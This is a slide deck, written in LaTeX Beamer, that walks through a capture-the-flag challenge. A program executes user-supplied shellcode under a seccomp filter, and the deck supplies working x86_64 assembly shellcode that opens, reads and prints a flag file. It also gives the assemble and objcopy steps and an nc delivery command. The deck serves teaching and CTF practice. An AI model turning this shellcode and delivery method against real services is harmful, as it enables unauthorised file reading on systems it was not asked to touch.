\documentclass{beamer}

\usepackage[utf8]{inputenc}
\usetheme{Warsaw}
\mode<presentation>{}
\setlength{\parskip}{\baselineskip} 

\usepackage{listings}
\lstset
{
    language=C,
    numbers=left,
    basicstyle=\tiny
}

\title{Shellcode/Seccomp CTF Writeup}
\author{Jake Drahos}


\begin{document}
\section{Intro}

\begin{frame}
{Setup}

Provided at beginning of CTF
\begin{itemize}
 \item Source Code
 \item Binary
\end{itemize}
\end{frame}

\begin{frame}
  A note on ``shell''/``pwn''-style CTFs:
  
  \pause
  Exploit needed on the server to avoid offline 
  analysis/{\tt strings} shenanigans
  
  It will be running with something like 
  {\tt \$ socat TCP-LISTEN:4444,fork,reuseaddr EXEC:./pwnable.elf }
  
  Simplest way to redirect stdin/stdout to a socket - can treat the 
  netcat command the same as running the exe locally*.
  
  Achieve the behavior locally, then provide the same input to the server.
  
\end{frame}

\begin{frame}
{Tools}
Tools used in this solve:
\begin{itemize}
 \item A text editor
 \item gcc (as an assembler)
 \item objcopy(1)
 \item objdump (optional)
\end{itemize}
\end{frame}

\section{Source Code Breakdown}

\begin{frame}[fragile]
{Process setup}
Unbuffered IO (for socat and especially for segfaults)

\begin{itemize}
 \item stdout buffered by libc (in userspace) until a newline
 \item libc will also flush on a call to flush() or graceful exit
 \item Not on a segfault!
 \item Worse yet: when stdout is not a tty (eg. a pipe - {\tt socat}), block buffering
 \item Solution: setvbuf(3)
\end{itemize}


    \begin{lstlisting}[firstnumber=41]
static void process_setup()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
 Allocate a page for shellcode and make it executable
    \begin{lstlisting}[firstnumber=50]
      pagesize = sysconf(_SC_PAGE_SIZE);

      shellcode = memalign(pagesize,  pagesize);
      if (shellcode == NULL) {
            perror("memalign");
            exit(1);
      }


      if (mprotect(shellcode, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC)) {
            perror("mprotect");
            exit(1);
      }
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
 Binary equivalent of exec(readline())
 \begin{lstlisting}[firstnumber=34]
      puts("Ready to receive shellcode...");
      read(STDIN_FILENO, shellcode, pagesize);

      puts("Executing shellcode...");
      ((void (*)(void)) shellcode)();
 \end{lstlisting}

 \pause Getting the syntax right on the first try feels {\it really} good.
\end{frame}

\section{Payload}

\begin{frame}[fragile]
Just grab an {\tt execve(``/bin/sh'')} payload from ShellStorm!

\pause It won't work.
\pause Seccomp will ruin your day.
 
\end{frame}

\begin{frame}[fragile]
{\tt seccomp(2)} 
 \begin{lstlisting}[firstnumber=66]
  struct sock_filter filter[] = {
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, arch))),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, FILTER_ARCH, 1, 0),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (EPERM & SECCOMP_RET_DATA)),
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_read, 0, 1),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_write, 0, 1),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_writev, 0, 1),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_open, 0, 1),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_openat, 0, 1),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_exit, 0, 1),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (EPERM & SECCOMP_RET_DATA)),
  };
 \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
{Allowed syscalls}

{\tt open(2), read(2), write(2)} are available, and the flag file is known:

\begin{lstlisting}[firstnumber=104]
        int fd = open("flag.txt", O_RDONLY);
\end{lstlisting}

Open the flag, read it into a buffer, then write the buffer to stdout (fd 1)

\end{frame}

\begin{frame}
{x86\_64 calling convention}
 
 {\tt syscall(\%rdi, \%rsi, \%rdx, \%r10)}
 
 syscall number in \%rax
 
 \begin{itemize}
  \item open: 2
  \item read: 0
  \item write: 1
  \item exit: 60
 \end{itemize}
 
\end{frame}


\subsection{Open the flag}

\begin{frame}[fragile]
    {\tt rax = open(flag, 0, 0) }
    
    \begin{lstlisting}[firstnumber=1]
.section .text
    lea     flag(%rip), %rax
    mov     %rax, %rdi
    mov     $0, %rsi
    mov     $0, %rdx
    mov     $2, %rax
    syscall
    \end{lstlisting}
    
    
    {\tt flag} is a label - instruction-pointer relative (PIC)
\end{frame}

\subsection{Read into buffer}


\begin{frame}[fragile]
    {\tt read(rax, rsp, 128)}

    \begin{lstlisting}[firstnumber=9]
    mov     %rax, %rdi
    mov     %rsp, %rsi
    mov     $128, %rdx
    mov     $0, %rax
    syscall
    \end{lstlisting}

Just use the SP as a buffer (it's free real estate)
\end{frame}

\subsection{Write to stdout}
\begin{frame}[fragile]
    {\tt write(1, rsp, 128)}
    
    \begin{lstlisting}[firstnumber= 15]
    mov     $1, %rdi
    mov     %rax, %rdx
    mov     $1, %rax
    syscall

    mov     $60, %rax
    syscall
    
flag:
    .string "flag.txt"

    \end{lstlisting}
    
    Bonus: {\tt exit()} at the end, then tack on the 
    string literal.

\end{frame}

\section{Exploit!}

\begin{frame}
 {Assemble the payload}
 
 Use {\tt as} or {\tt gcc}.
 GCC can detect assembly input (.s extension) and will treat it appropriately.
 
 \pause
 
 {\tt gcc -c payload.s}
 
 {\tt as -o payload.o payload.s}
 
 Obtain a {\tt payload.o} ELF object.
\end{frame}

\begin{frame}
 {Who needs a linker?}
 
 The code is already position-independent and relies on no external symbols.
 
 {\tt objdump -r payload-x86\_64.o} outputs no relocation entries
 
 No need to get a linker script involved
 
 {\tt objcopy -O binary -j .text payload.o payload.bin }
 
 Extracts the raw contents of the .text section as binay data
\end{frame}

\begin{frame}
 {PWN!}
 
 {\tt ./runner.elf < payload-x86\_64.bin }
 
 Or for realsies
 
 {\tt nc ip < payload-x86\_64.bin }
\end{frame}

\begin{frame}
 {Sources}
 https://github.com/drahosj/shellcode-ctf 
 
 Includes source/binary for runner, a Makefile (may need tweaking to recompile runner),
 and two payloads (non-working exec-based, and working).
 
 Run make to build the payloads, and the examples should work.
\end{frame}



\end{document}
